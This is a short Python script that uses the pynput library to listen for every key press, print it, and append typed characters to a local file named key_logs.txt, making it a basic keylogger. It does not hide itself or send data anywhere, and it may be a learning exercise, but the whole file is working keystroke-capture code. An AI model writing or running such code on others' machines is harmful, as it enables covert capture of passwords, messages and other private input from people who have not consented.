from pynput import keyboard

def key_pressed(key):
    print(str(key))
    with open('key_logs.txt', 'a') as keyLogs:
        try:
            char = key.char
            keyLogs.write(char)
        except:
            print('error, unable to record keystroke')


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()